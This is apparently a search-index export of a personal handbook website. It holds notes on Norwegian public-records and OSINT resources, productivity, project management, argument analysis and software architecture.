Norwegian Mapping Authority, the Cadastre, and the Land Register Boretslag Info You can see when debts where made and the price something was purchased, refinancing is also visible Bolig.ai https://www.eiendomspriser.no/ Budstikka - Property Transers Eiendom norge Domstol - Norwegian court rulings can be made partially available to the public, though privacy restrictions apply and many legal documents are anonymized. 1881.no - Online directories for phone numbers, addresses, and sometimes additional public info (e.g., businesses and individuals). arkivverket - Repository of historical and archival materials, both for governmental and non-governmental entities. NB.no - National repository of publications in various media, some digitized and freely available. Vegvesen - Contains Vehicle Information You can check all the cars that someone has owned (require SSN) You can check who (only name) ons a car with a given license plate https://www.digitalarkivet.no/ https://www.doffin.no/ - Database for public procurement Public Tenders Database Resources # Deep Dive: Exploring the Real-world Value of Open Sourc Open Source Intelligence Techniques: Resources for Searching and Analyzing Online Information (9th edition) https://www.bellingcat.com https://benjaminstrick.com/ Renee Diresta Blog - If you give a mouse a cookie "},{"id":60,"href":"/productivity/","title":"Productivity","section":"","content":" Productivity # Dealing with the large stream of information # Try to find a system that works for you, cause you can\u0026rsquo;t change the fact that there WILL be a large stream of information coming your way.\nYou can consider using David Allen\u0026rsquo;s \u0026ldquo;Getting things Done\u0026rdquo; approach:\nDrop means read, understand, and then archive. Itâs what you use for anything that doesnât require any action on your part. Always archive, never delete. Delegate is for things that do require action, but not from you. Make sure that it gets to the right person and is understood by them, and make a note for follow-up. It can be someone you report to, reports to you or even outside that line. Within your own team, you only ever delegate tasks, not responsibility. Find the right person that can get the task done. Preemptively send them all the information that you think they might need (and that you have access to), rather than relying on them to ask. Ask them to acknowledge that they have received what they need. Make a note to follow up to see if they need anything else, and follow through by seeing the task to completion. Defer means it needs doing, and itâs you who needs to do it, but it doesnât need doing immediately. Enter it into your task list, and clear it from your inbox. Add the task immediately to some sort of queue (for email, this can be a folder named âNeeds Replyâ), Make sure to go through that queue at a later time to prioritize, Absolutely ensure that you make time to go back and actually do your prioritized tasks, at a time you consider convenient. Do are the (typically very few) things that remain that need to be done by you, and immediately. Tell people that youâre doing them, because youâll want to be uninterrupted. Update your chat status, put some blocked time in your calendar. Make sure youâll be uninterrupted. For email, turn off all your notifications. Plow through all the undropped, undelegated, undeferred items in your inbox until itâs empty. "},{"id":61,"href":"/project-management/","title":"Project Management","section":"","content":" Project Management # Utilization of many different skills, resources, tools, techniques, and accumulated wisdom in order to effectively coordinate project activities and achieve goals.\nKey Responsibilities # Manage Project Requirements Maintain control over scope and objectives Maintain activites align with goals Administrate change control Capture evolving needs by the scope and objectives. Balance stakeholder needs in implementation the most appropiate solution Address stakeholder needs Maintain communication Ensure stakeholders remain up to date with appropiate communications. Ensure project team informed of all relevant changes and information. Balance Resource Constraints Limited resources are present in every project environment. Must work to balance contraints and priorities Project Constraints Scope Schedule Risk Budget Quality Resources You must balance between project constraint types consciously to achieve your project requirements. You must decide which project constraints take higher priority based on project requirements. Remain mindful of the outcome, goal or reason that a project/initiative exists, not just defined deliverables. Foundations # Key thought process of a project, to make sure it has actually value the investment? It can be less strict, but use these foundations to evaluate of the project has value and if all stakeholders agree on the scope or objectives.\nNeeds Assesment Maybe conducted by project manager, busienss analyst or external. Determine underlying needs that indicate an oppertunity for a project that can create value or solve problems. By addressing needs, value is created. Business Case Lists objectives and justifications for the project. Should indicate economiv feasibility and expected net benefit of project. Timeline of benefit realization vs incurrance should be described. Benefits Management Plan How and when project benefits will be delivered. Define target benefits and timeframes, list risk factors and assumptions/constraints. Metrics that can be used to verify delivery of benefits. Project Charter Founding project document created or approved by project sponsor. Defines core project objectives, provides for funding, names key stand and project manager. Project Management Plan Create by PM and Team Describes how ojectives will be completed and how work will be managed. Key Project Roles # \u0026hellip; Next\nRequirements for a Project # A business case is made by proving the results of a project will fullfil one or more needs. The value creation of a project is dependent on how well it meets needs relative to the costs incurred.\nThe value is not perse financial, can be also other gains, benefits or value\nTypes of project value # Financial Strategic Social good Increase Quality / Resilience Organizational empowerment Customer satisfaction Technological Innovation Intellectual Property "},{"id":62,"href":"/psychology/","title":"Psychology","section":"","content":" Psychology # Evolutionary Psychology # \u0026hellip;todo\nResources # Why Facts Donât Change Our Minds "},{"id":63,"href":"/reasoning/","title":"Reasoning","section":"","content":" Thinking # Chapter 1: An Overview # Thinking is any mental activity that helps formulate or solve a problem, make a decision, or fulfill a desire to understand. It is searching for answers, and reaching for meaning. To be a succesful problem solver, you will need both factual knowledge and proficiency in thinking. Good thinking: Good thinking is a matter of habbit, yes some will have a more talent for it, but its a habbit that can be trained and improved. Don\u0026rsquo;t need to be in the NBA to enjoy basketball. IQ seems not connected to this. They have learned strategies for thinking. They have learned strategies to deal with frustration (conusion, mental blockers, \u0026hellip;). They have learned strategies to regain focus/concentration. Comparison: Good Problem Solvers: Read a problem and decide how to begin attacking it. Bring their knowledge to bear on a problem. Go about solving the problem systematically. (e.g. try simplifyng, breaking into smaller problems, \u0026hellip;) Tend to trust their reasoning and have confidence in themselves. Maintain a critical attitude throughout the problem-solving process. Poor Problem Solvers: Cannot settle on a way to begin. Convince themselves they lack sufficient knowledge. Plunge in, from one part of the problem to the other, trying to justify first impressons Tend to distrust their reasoning and lack confidence in themselves. Lack of a critical attitude and take too much for granted. Brain At work: Your brain has 2 distinct phases that complement each other during problem solving and decision making. The Production Phase: Most closley related to creativity, it produces solutions, ideas, responses. There are techniques to be learned to be better at this. The Judgement Phase: Most closely related to critical thinking, it examines, judgjes, adds refinements, evaluates. Meaningful Discussion: Many hosts demand that their guests answer complex questions with simple yes or no answers. If the guest responds that way, they are attacked for oversimplifying. If, instead, they try to offer a balanced answer, the host shouts \u0026ldquo;You\u0026rsquo;re not answering the question\u0026rdquo;.\nGuidelines: Wehever possible, prepare in advance. Set reasonable expectations. (people will probably not change their conviction on the spot) Leave agotism and personal agendas at the door. Contribute but don\u0026rsquo;t dominate Avoid distracting speech mannerisms Listen actively Judge ideas responsibly (try to not have your general impressions or feelings get in the way to judge something on its merrits) Resist the urge to shout or interrupt Preliminary thinking strategies When you must analyze a single statement: Read it again Ask yourself \u0026ldquo;Does this make sense?\u0026rdquo; If you have a firm YES/NO, decided what makes to respond that way. That argument is probably what to explain to others. When you get stuck, words fail, dead end road, so difficult challenges: Use a diagram Example: \u0026ldquo;All dogs are animals. Fido is a dog, therefore Fido is an animal\u0026rdquo; you could diagram as this: Animal \u0026lt;- All dogs \u0026lt;- Fido When the statement presents as fact something that is not factual, identify the error and explain how it invalidates the statement. When the statement confuses two terms or ideas, identify the confusion and show its effect on the statement as a whole. When the statement presents a conclusion as the only possible conclusion and other conclusions are also possible, present the other conclusions and demonstrate that they, too, are reasonable (perhaps more reasonable). When the statemnt, or some part of it, is open to interpretation, use the if-then approach to analysis. Example: IF X is true THEN conclusion A, IF Y is false THEN conclusion B Also valid if you are unsure about facts When there is a dialog First read it to understand the discussion in its entirety Then read each person\u0026rsquo;s comments individually, note the progression of their thoughts and the degree of logical consistency. Finally read for implications and assimptions (these are ideas that are not stated directly but are nevertheless identifiable by what is stated directly) Reasoning Types # Reasoning is a cognitive process that involves drawing conclusions, making judgments, or forming inferences based on facts or premises. This process has been explored from various perspectives:\nSymbolic reasoning: involves the manipulation of symbols that represent ideas or objects and it is often used in mathematics and logic to represent numerical values or logical propositions. Causal reasoning: focuses on discerning the relationship between a cause and its effect, aiming to understand how certain events can impact other. Inductive reasoning: making broad generalizations from specific observations Deductive reasoning: applying general principles to specific cases Abductive reasoning: forming the best hypothesis based on incomplete information Reasoning (Book) # Nature of reasoning # Reasoning is a skill in using thought and language, and it is profficiency in this skill, not the mere possesion of language, which distinguishes the human species from the others on this planet.\nReasoning has function to help us find answers to our problems.\nReasoning has funcfion to express reasons in publicly accessible language.\nPublicly accessible language means that it must be easily accessible or understandble to others.\nThe emphasis on communication, on the crucial importance of the social activity of reasoning, means that we can scarecely afford any jargon at all.\nDifferent texts might use different terminology. Reading without understand = Basic Reasoning\nRational = Reasonable\nPractice is more valuable than theory on Reasoning, it\u0026rsquo;s like language, there is no adequate grammar, it changes, you have to use it, just like learning a language.\nPurpose of reasoning # Reasoning can be used in the service of criticism Reasoning can be used in the service of persuasion or communication. Reasoning is the means whereby we reach new conclusions, gain new knowledge, uncover new and important facts. Creativity \u0026amp; Reasoning # Creativity is a major component in reasoning. The process of trying to think of alternative explanations of a set of facts, is an entirely creative process.\nArgument Analysis # 3.2 Inconcistency Types Logical Inconsistency: Can be detected by anyone who speakers the language without other special knowledge. (aka Contradiction) Factual Inconsistency: A logical inconsistency between what is said (Antwerp is near Oslo) and an unstated fact (Antwerp is in Belgium, but that\u0026rsquo;s a fact or special knowledge that you need to spot the inconsistency). Improbable/Implausible/Quasi-Inconsistent: Something described of having 2 properties which are almost certainly incompatible (that dress is overall green and overall red, but certain materials can be that based on light conditions ). Contradiction == logical inconsistency Consistency is a requirement of communication. Avoid inconsistency/contradiction is crucial. The main point of argument presentation is to show that some kind of inconcistency or implausability is involved in accepting the premises of the argument and rejecting the conclusion. Arguments are meant to be persuasive; and they succeed in being persuasive if they begin with assertions that the listener or reader is known to accept, and if they continue by showing that acceptance of those asserts (which are called the premises of the argument) requires the acceptance of the conclusion. The power of an argument depends upon two things: It should start off with premises that are known to be true or can be shown to be true. It should proceed to demonstrate or exhibit the way which these premises \u0026ldquo;force\u0026rdquo; one to accept the conclusion(s). The force of whishing to avoid contradiction/inconsistency if a weaker kind. You start with a premis (things the other accept) and then steps (aka the inference) that built towards a conclusion. If someone disagrees but agrees with the premsie, they must rebunte one of the steps. You are 18 years old (premise), men below age 25 don\u0026rsquo;t have fully matured brains (step/inference 1) according to sience, so you are not fully mature (Conclusion), Argument types Deductive argument - Logical deduction (e.g. arithmics showing how much something costs, including hidden costs) - Easy attacked with facts or newer facts Inductive argument - Statistical/probable (e.g. its very likely interest rate will increase next month, because \u0026hellip;) - Harder to attack, cause it\u0026rsquo;s implied it\u0026rsquo;s not factual, but likely. Inconsistency is great attack/weapon if poeople have no interest to communicate. Reasoning can be used in the service of criticism or in the service of persuasion or communication. Logic or reasoning is the means whereby we reach new conclusions, gain new knowledge, uncover new and important facts. Reasoning is a constructive and creative activity that leads us to knowledge. Creativity is important to reasoning, the process of trying to think of alternative explanations of a set of facts, is an entirely creative process. Good thinking, reasoning and creativity go hand in hand An argument is logically sound when the reasoning is sound, that the inferences/steps from premise to conclusion are sound, without saying anything about whether the premises are themselves sound (you might not know the facts about the premises) An argument is factually sound means that the premises are in fact true. An argument can be criticized either by focusing on the truth of the premises, or the goodness of the inference/step. These 2 ways are directly mapped to the factual sound argument and logically sound argument The Logic of argument : all the steps/inferences from premise to conclusion A conclusion is an inference, actually every inference/step is a kind of mini/inbetween conclusion An inference and implication are different. An implication is something that is not directly inferenced by the speaker of the argument, an inference is a clear step that the speaker takes. âThe eggs are now rotten, therefore itâs not safe to eat. The inference is that you canât eat the eggs because theyâre rotten, an implication would be, that the spoiled eggs probably now smell like rotten eggs. The 7 steps in argument analysis overview # The steps are not highly technical in itself, the difficult thing is to follow them carefully and skillfully.\nClarification of meaning (of the argument and of its components) Identification of conclusions (stated and unstated) Portrayal of structure Formulation of (unstated) assumptions (the âmissing premises â) Criticism of the premises (given and missing) and the inferences Introduction of other relevant arguments Overall evaluation of this argument in the light of 1 through 6 Step 1. Clarification of meaning (of the argument and of its components) # Clarity of: Terms, Phrases, Sentences, Suggestions or Implications and Arguments. Method # A. Read most or all of the argument of passage under consideration before trying any clarification.\nB. Replace unknown terms by reference to a dictionary.\nC. Rewrite any unclear parts, using clearer language.\nD. In particular, identify vague or ambiguous terms that you suspect the argument is \u0026rsquo;exploiting'.\nE.g By shifting from one meaning to another. Translate the clause or sentence containing each occurrence of these terms into other language that conveys the correct meaning of the term in each context. That will show up any shifts in meaning E. Write out any important unstated but intended implications or suggestions of the premises, the conclusions, and the argument as a whole.\nWhat\u0026rsquo;s it trying to get across that isn\u0026rsquo;t actually spelled out? F. Ask yourself if you really understand how everything fits together. In other words, have you a \u0026ldquo;feeling\u0026rdquo; for the argument or passage as a whole (even if you don\u0026rsquo;t accept it)?\nDon\u0026rsquo;t let hostility you may have for the position expressed mislead you into misrepresenting the argument - say, by making it more stupid than it already is (you think). Look over results of A through E and criticized the passage for unclarity where appropriate. Most of step 1 is laying ground for later analysis. But this part, G is a component of your final criticism. Remember # The \u0026ldquo;meaning\u0026rdquo; of an argument (or word, or other expression) is not what the arguer intended but what he or she said, taken as a native speaker of the language would hear it. Still, You want tom kae the best guess at the arguer\u0026rsquo;s intended meaning, and we can take account of context. Ine one context \u0026ldquo;Dogs Bite\u0026rdquo; may mean \u0026ldquo;All dogs bite\u0026rdquo;; ion another, \u0026ldquo;most do\u0026rdquo;\u0026rsquo; and in another \u0026ldquo;Dogs, sometimes bite\u0026rdquo;. That is, the meaning of words or phrases isn\u0026rsquo;t to be found in those worlds all by themselves. Look at the context; if the speaker is present, ask for clarification. If not, treat the words as having their usual meaning. Step 2. Identification of conclusions (stated and unstated) # Method # A. Some of the unstated conclusions turn up in step 1(E) while you\u0026rsquo;re trying to get the meaning straight. Set them out now; write them in below the passage of text, or fit them in (perhaps in the margin) where they come in. Are there any more, perhaps unintended but unavoidable ones? Get them all states clearly and fairly. Which are the most important ones? Is there one main conclusion? (there usually is.).\nB. To located the stated conclusions, look for indicate words like therefore, because, so and thus and for replacement cues such as the location d the end of a paragraph.\nThese cues are bu no means always reliable; you also have to depend on your sense of the meaning of the passage as a whole. C. Notice that here may be several conclusions in the argument, each building on the previous ones. And a passage may also contain several entirely separate arguments.\nD. Within any one argument, try to decide if that argument has a main conclusion (or conclusions) and if the others can be ranked as to their importance.\nWe can call the second group \u0026ldquo;secondary\u0026rdquo; conclusions, some of which may still be quite important, others more or less incidental. Step 3. Portrayal of structure # Set out the relationships between conclusions and premises (in the parts of the passage that are arguments). You\u0026rsquo;ve already identified the conclusions. Now you just need to ask yourself what assertions are being put forward to support each of these conclusions. These are the premises. Typically, there will be other material in the passage that is neither a premise or a conclusion. It may be instructions, rhetoric, repetition, flourish, or other statements. The following procedure is unnecessary for simple arguments, and it should be applied to very long ones a page or paragraph at a time.\nMethod # A. Number each separate assertion; note that one sentence may contain several assertions.\nPut square brackets at the beginning and end of each asserts, and number it it in the margin or above the line of type. B. Do not give a number to repetitions of the same assertion.\nC. Do not number irrelevant statements (\u0026ldquo;asides\u0026rdquo;). Remember that your judgments or irrelevance or repetitiousness. Remember that your judgement of irrelevance or repetitiousness are crucial to your evaluation of the argument, and you must be ready to defend them.\nD. Do give a number to the implicit conclusions you first located in 1E and 2A.\nE. Set out the relationships between the relevant assertions in a tree diagram like the one shown here. It is read downward on the page.\nIf 1 and 2 are claims put forward to support 3 and are not themselves supported by any other assertion, and if 3 is supposed to support 4, but not vice-versa, the diagram looks like the illustration. If 4 might be an unstated conclusion, you might put it in parentheses, as shown.\nF. For a \u0026ldquo;balance of considerations\u0026rdquo; argument, where we say that 1, 2, and 3 suggest the conclusion 5, \u0026ldquo;Despite\u0026rdquo; 4 (which points the other way), use symbolism as shown in this diagram.\nG. Sometimes, you can set the structure out on a single line, e.g., ( 1 + 2 + 3 + 4) -\u0026gt; 5 or 1 -\u0026gt; 2 -\u0026gt; ( 3 + 4 ). The arrow then stands for \u0026ldquo;implies\u0026rdquo;. Sometimes the suggestion is made that, for example, ( 1 + 2 ) imply ( 3 + 4 ) and are implied by them then use a double-ended arrow, thus: ( 1 + 2 ) \u0026lt;-\u0026gt; ( 3 + 4 ).\nH. Terminology: IF statement 1 implies statement 2, we can also say 2 \u0026ldquo;follows from\u0026rdquo; 1, or \u0026ldquo;is a consequence\u0026rdquo; of 1, or that we can infer 2 from 1. It is incorrect to say 1 infers 2: statements imply but can\u0026rsquo;t infer; people can do both (but not at the same time).\nI. While doing this, begin to look for places where there are significant, unstated assumptions (\u0026ldquo;missing premises\u0026rdquo;). You can locate them by adding circles to the tree diagram with letters in them at the appropriate places, thus:\n(A is an assumption that is needed to support the interference from 1 and 2 to 3) To formulate them exactly, see the next section.\nStep 4. Formulation of (unstated) assumptions (the âmissing premises â) # The most difficult part of reconstructing an argument is fair and clear formulation of the \u0026ldquo;missing premises\u0026rdquo;, the unstated assumptions. You must distinguish between:\nA. The Arguer\u0026rsquo;s assumptions, what he or she consciously assumed or would accept as an assumption if asked.\nB. The minimal assumptions of the argument whatever is, logically speaking, necessary to make it possible to get from the premises to the conclusion of the arguer.\nC. The optimal assumptions, usually stronger claims than B which are logically adequate and independently well-supported.\nStep 5. Criticism of the premises (given and missing) and the inferences # Criticism of expression is already covered in 1(g).\nCriticizing an inference from statement 1 to statement 2 means criticizing the claim that 1 supports 2. You do not need to know where 1 is true or not in order to consider whether it supports 2. You just have to ask, if 1 were true, wouldn\u0026rsquo;t 2 then have to be true, or at least very likely be true?\n(Understanding this point is also the key to testing a hypothesis, for when we say, \u0026ldquo;If Jones did kill Mrs. Robinson, he would have to run a mile in 5 minutes to be in the restaurant by 9:10 PM\u0026rdquo; we\u0026rsquo;re not saying he did or that he didn\u0026rsquo;t, but we are suggesting that it\u0026rsquo;s reasonable to infer from the claim that he did it to a certain conclusion. By checking on whether he could run this fast, we are testing the hypothesis that Jones was the murderer)\nCriticizing a premise requires that, if the argument is going to be any good as a way of marshaling support, the forces it calls up had better be strong, i.e., the premises must be reliable. When the premises are technical claims, you aren\u0026rsquo;t expected to comment on them in the course of logical analysis. When they are definitions or analyses subject to logical criticism, or matters of common knowledge, you are expected to asses them.\nGood criticism of an argument requires that you look at both the reliability of the interference and the reliability if the premises. You might think that there\u0026rsquo;s no point in looking at the interference if the premises are false. But your criticism of the premises may be either in error or fairly easy met by minor modifications; you must guard yourself against this by covering both types of criticism. Good criticism also involves selective attack; first attack the main conclusions (via the premises and interferences that bear on them), and spend less time on the others. And attack with your strongest weapons first do not start by making picky points, following the order of the statements in the original. Start in on the key weaknesses: start with your strongest criticism. Strong criticisms are those that could not be met except by extreme modification or complete capitulation.\nCriticism Strategy involves the key move of \u0026ldquo;counter exampling\u0026rdquo;. It applies to many types of premise and all types of inference, and it is an exercise in imagination. Here\u0026rsquo;s an outline of the procedure that you can refer back to later. It may hard to follow in this brief summary, but we\u0026rsquo;ll explain it with examples in the next section.\nA. Counter example a generalization - \u0026ldquo;All A\u0026rsquo;s are B\u0026rsquo;s\u0026rdquo;\u0026quot; or \u0026ldquo;Any A is B\u0026rdquo; - you think of of indubitable cases of A that are definitely not B. (It is irrelevant to think of B\u0026rsquo;s tha aren\u0026rsquo;t A\u0026rsquo;s, since the claim wasn\u0026rsquo;t that all B\u0026rsquo;s are A\u0026rsquo;s). B. Counter example a definition - \u0026ldquo;A means the same as B\u0026rdquo; - treat it as a two-way generalization (i.e. \u0026ldquo;Any A must be by definition be a B\u0026rdquo; and \u0026ldquo;Any B must by definition be an A\u0026rdquo;) and look for counter examples in the reals of possibility as well as actually, since a definitional truth must hold whenever the language can be clearly applied, not only where it has been applied. C. Counter example an inference - Treat it like a one-way generalization. (It will be a definitional generalization in the case of strict deductions, as in most mathematical inferences; a factual generalization in the case of most scientific inferences.) That is, if the statement A is supposed to imply statements B, try to think of cases where A would be true but B would be either definitely false or unlikely. D. Counter example an interpretation or analysis - treat it as an inference from that which which is interpreted to the interpretation itself, and handle it as in c. (It may be intended as an equivalence, that is, a two-way inference) Remember! # If you have extensively reconstructed an argument by filling in so many missing premises and conclusions, you will have done so partly by asking what it would take to make a good argument. Hence you often won\u0026rsquo;t find much to criticize about in the inferences in the reconstructed argument - your criticism will fall instead on the extra bolstering premises you had to add.\nStep 6. Introduction of other relevant arguments # If you stopped after Step 5, you\u0026rsquo;d have a thorough critique and sometimes that\u0026rsquo;s all that\u0026rsquo;s called for, but you wouldn\u0026rsquo;t know what to think yourself. For to discover that a particular argument has some defects is not to discover that it shouldn\u0026rsquo;t be given some weight, perhaps a good deal. Perhaps, enough to act on. At this point, then, you must step backward and try to get a perspective on the argument. First, ask yourself wether there are arguments on the same issue which point in another direction, perhaps to the opposite conclusion or to a somewhat different conclusion. (In the case of argument from analogy, you may find that the very same analogy can be viewed somewhat differently and taken to support the opposite conclusion.) next, look for the other arguments that support the same conclusion.\nStep 7. Overall evaluation of this argument in the light of 1 through 6 # Go back to your criticisms. How devastating are they? Could they be met by modest modifications or the original material? Even when devastating, do they cover all the original lines or argument? Look at the results of Step 6. They not only should help you decide what you think but they also may help you to see what the original argument was after. Have you overcritizied it? Now, make your final judgement on the argument. Grade it, in several dimensions if you like, but then make yourself give an overall grade. It\u0026rsquo;s a cop-out not to. You must decide where it does have force, and how much for you.\nResources # Art Of Thinking by Vincent Ruggiero. Reasoning by Michael Scriven. "},{"id":64,"href":"/software-architecture/","title":"Software Architecture","section":"","content":" The (Software) Architect Handbook # Written and compiled by Ian Segers as personal guide for his job as Solution Architect. In case you are reading this directly on GitHub, you can read this Markdown rendered on the GitHub Page. This is a static website which gets easily cached. To make sure to have the latests contents, do a hard refresh (CTRL + SHIFT + R for chrome/brave/edge).\nWhat Is Software Architecture? # Many definitions exists out there, but I like to inspire my definition on Systems, from the field of Systems Thinking.\nSoftware architecture is everything that matters about the architecture and design of information systems. whatever that might be.\nBefore we further explain what that exactly might entail, it is important to first understand what are systems.\nSystems # A \u0026ldquo;system\u0026rdquo; in systems thinking is a set of interconnected elements, which can be subsystems in their own right, organized within defined boundaries. These elements function cohesively to achieve a common purpose or produce specific outcomes, influenced by the system\u0026rsquo;s structure and internal interactions.\nHere can find a detailed breakdown of the definition.\nA Systems Analogy # A system can be as simple as a bathtub. The bathtub holds water, there is a faucet that allows to regulate inflow of water, and there is a drainage pipe that allows for outflow of water. There are interconnected elements, and they produce a specific outcome (e.g. fill up the bath tub) based on the systems\u0026rsquo;s structure and internal interactions (open the faucet, close the drainage).\nAn example op an adjacent system would be the sewage system. The bathtub system and sewage system are inter-connected. The defined boundary of the bathtub system is the faucet, tub, and drainage pipe. The defined boundary of the sewage starts from the drainage pipe and ends at the sewage filtering station.\nThe bathtub system and sewage system are both part of a larger overarching system called the water supply and sanitation system. Making the bathtub system and the sewage systems subsystems of the water supply and sanitation system.\nYet again, the bathtub system itself can have multiple subsystems. The faucet for example can be examined more closely, and be considered as a (sub)system in its own right again, detailing the internal workings of the faucet.\nNotice that a system is not just about how it is structured. There is also a time aspect to this, how does the system behave over time? How does that behavior change as we interact with the system? (e.g. close the faucet, open the drainage, \u0026hellip;) This is what we mean with \u0026ldquo;these elements \u0026hellip; produce specific outcomes\u0026rdquo;.\nA Software System # With Information Systems we can look at it in the exact same way. An organization can be seen as one large IT system - with each component in it - being a system in its own right (e.g. a webserver), producing specific outcomes and behavior. This comes with a defined boundary (e.g. all the on-prem systems of the organization). All these systems are interconnected, facilitating communication between and within (sub)systems. Data being the content that is communicated over these interconnections or lives within components.\nThis means that one can \u0026ldquo;zoom in\u0026rdquo; on any component of an information system and look at it\u0026rsquo;s internals, exposing potential another subsystem. However, for ease of reasoning about a system diagram, we don\u0026rsquo;t expose the details of any subsystems, based on what the diagram tries to communicate.\nInformation systems also have a time aspect, it\u0026rsquo;s not a static snapshot, the system over time produces certain outcomes.\nBoundaries and Domains # A system has defined boundaries, and that\u0026rsquo;s what we do also with information systems. An information system has defined boundaries, detailed what components are part of it, some might use \u0026ldquo;scope\u0026rdquo;. These boundaries or scope usually encompass a \u0026ldquo;domain\u0026rdquo;. A domain is a name or term that indicates on what premise the scope or boundaries of the system are defined. This could be a business domain (e.g. Marketing) or a technical domain (e.g. Database Layer). In this handbook we refer to this as Technical and Domain partitioning, telling on how we define our boundaries of our systems(s).\nDomain-Driven-Design (DDD) has a concept of \u0026ldquo;Bounded Context\u0026rdquo; that is meant to aid in defining your domain, which should indicate how the boundaries are defined.\nSome Clarifications # Elements in Systems Thinking are Components in Software Systems. Many Components in a Software Systems can be software systems in their own right. Components are interconnected - meaning - they can communicate. The (software) domain usually refers to a system\u0026rsquo;s specified boundary. The pattern or philosophy that a system software is structured Software systems and information systems will be used interchangeably. Architecture Properties # Architecture Style is the overarching philosophy that: Guides the structuring and partitioning of the software system and its components. Guides the preferred integration (architecture) patterns between the components of the software system. Guides the preferred integration (architecture) patterns between the software system and other external software systems. Targets certain architecture characteristics. Architecture Characteristics: describes entire software system\u0026rsquo;s behavior. One would aim to target a specific set of desired characteristics that accommodates your system\u0026rsquo;s needs. Architecture Fields # Application Architecture focuses on designing and deciding upon the individual components of the system. Integration Architecture focuses on the flows and communication between these components. Data Architecture focuses on the content residing within these components and the information that moves through the system\u0026rsquo;s flows and communications. Evolutionary Architecture focuses on how the constant changes over time to a software system can be best handled, without eroding your architecture and desired architecture characteristics. Laws Of Architecture # See Topic: Laws Of Software Architecture\nDoing Architecture # When \u0026ldquo;doing architecture\u0026rdquo; as a software architect you should:\nUnderstand the current architecture, which current architecture style(s) it has, and its current architecture characteristics. Understand the future goals of the organization and its information system(s). Define a clear target state of the architecture, which target architecture style(s) it should have, and its desired architecture characteristics that accommodate the future goals of the organization. Define a roadmap from the current to target architecture. Govern the transition/process from the current to the target architecture. Use Architectural Decisions for implementation rules. Use Design Principles for implementation guidance. Make Development Teams Effective Obtain feedback during the transition/process and refine your roadmap and target architecture as you learn. Coach and mentor people on the transition/process journey. Topics # Anti-Patterns Architectural Thinking Architecture Decisions Architecture Risk Best Practices Clean Architecture Components Conways Law Domain-Driven-Design Diagramming and Presenting Architecture Evolutionary Architecture Feature Toggles How To Do\u0026hellip; Making Development Teams Effective Negotiation and Leadership Skill Laws Of Software Architecture Modules Software Architect Role Systems Thinking Team Topologies Useful # Resources Thought Leaders Nuggets Of Wisdom that contain some good wisdom. Copyright # This handbook is from my experience and many materials that I have read. My intention is to clarify on every topic I cover my sources that I have used, it can be in my own words, it can be sometimes copied from any of my sources. My apologies if I failed to do so, please contact me (via a PR on this GitHub Repo, great for transparency) if I did fail to do so. I obviously don\u0026rsquo;t take credit for when I quote source material and you should proceed with caution if you want to reuse these.\nTodo # Here you can find my raw todo notes on all topics that I plan to address in this handbook.\nOthers # "},{"id":65,"href":"/software-architecture/application-architecture/readme/","title":"Readme","section":"Software Architecture","content":" Application Architecture # Ideas # Introduction to Application Architecture:\nThe essence and importance of application architecture Role of an application architect Historical perspective: Monolithic to microservices and beyond Architectural Patterns \u0026amp; Styles:\nLayered (n-tier) architecture Event-driven architecture (EDA) Microservices architecture Service-oriented architecture (SOA) Domain-driven design (DDD) Model-View-Controller (MVC), Model-View-ViewModel (MVVM), and other design patterns Component-Based Design:\nModular development Design principles: SOLID, DRY, etc. Designing for reusability and maintainability Scalability \u0026amp; Performance:\nHorizontal vs. vertical scaling Load balancing strategies Caching strategies: CDN, in-memory databases, application-level caching Cloud-Native Architectures:\nTwelve-Factor App methodology Serverless architectures and functions as a service (FaaS) Container orchestration with tools like Kubernetes Resilience, Reliability, and Recovery:\nDesigning for fault tolerance Circuit breaker and bulkhead patterns Backup and disaster recovery strategies Security in Application Architecture:\nAuthentication and authorization strategies Securing APIs and microservices Threat modeling and secure design principles APIs in Modern Architecture:\nRESTful services GraphQL API gateways and management State Management:\nStateful vs. stateless design Client-side vs. server-side state Distributed state and session management Event Sourcing and CQRS (Command Query Responsibility Segregation):\nBenefits and challenges Implementations and use cases Continuous Integration \u0026amp; Continuous Delivery (CI/CD): The importance of CI/CD in application architecture Building a pipeline: Tools and best practices Infrastructure as Code (IaC) Monitoring, Logging, and Observability: Application performance monitoring (APM) tools Structured logging and centralized log management Distributed tracing and diagnostics Integration with External Systems: Webhooks, connectors, and adapters Asynchronous communication with message queues and event streams User Experience (UX) and Frontend Architectures: Single Page Applications (SPAs) and Progressive Web Apps (PWAs) Server-side rendering (SSR) vs. client-side rendering Mobile application architectures: native, hybrid, and cross-platform Emerging Trends \u0026amp; Technologies: Edge computing in application architecture AI/ML integrations and architectures Quantum computing\u0026rsquo;s potential impact Case Studies \u0026amp; Real-World Scenarios: Dissecting real-world application architecture challenges and solutions Lessons from successful and less-successful projects\n"},{"id":66,"href":"/software-architecture/architecture-characteristics/readme/","title":"Readme","section":"Software Architecture","content":" Architecture Characteristics # The software development process has many techniques for (functional) requirement gathering. Mostly functional. As architect, one must consider many other factors in addition to those requirements that are not directly related to the domain functionality.\nDescription # The important aspects of the system, independent of the problem domain.\nCharacteristics describe our desired behavior of a system across different dimensions. it is important to understand the desired characteristics and to make an explicit commitment to them. A system must not comply or concern itself about all the possible Architecture Characteristics that we can think of, cause for each system, this will differ.\nWhat is important, is that a conscious and explicit decision is made of what Architecture Characteristics are important for given system. In addition these decisions must be clear and preferably quantifiable so it is easy to asses of the system complies with desired characteristics or not.\nCharacteristics are often interconnected. This means it can be often challenging to accommodate various characteristics as they might oppose each other in design. Hence, why it is important to be picky and limited in the preferred characteristics that you prioritize. As always, it\u0026rsquo;s a trade-off.\nNote: Non-Functional requirements are the same, but not considered a good name.\nCriteria Of A Characteristic # See Criteria Diagram\nCriteria 1: Specifies a non domain design consideration Explicit - Usually/might appear in requirement documents Specify operational and design criteria for success, concerning how to implement the requirements and why certain choices were made. Example: Performance never appears in requirements documents, but we need to specify which level of performance is desired. Criteria 2: Influences some structural aspect of the design Implicit: Usually don\u0026rsquo;t appear in requirement documents Does this characteristic require special structural considerations to succeed? Example: Security is baseline requirement, but when you need to facilitate payment, if you use a third-party payment processor or in-application payment processing, you might reconsider how to structure this. This characteristic will have impact on the architecture if you do in-application and security is a concern Criteria 3: Is critical or important to application success Support for each characteristic adds complexity to the design. Therefore, the least characteristics the better. Categories # Everyone might create their own interpretation of these terms, but we commonly separate them into 3 categories.\nOperational: Overlap heavily with operations and DevOps concern. Structural: Code quality concerns, such as modularity, coupling between components, code quality and such. Cross-Cutting: When the category is less clear or has overlap. List Of Characteristics # A universal list doesn\u0026rsquo;t seem feasible, there are various variations and interpretations of possible characteristics. 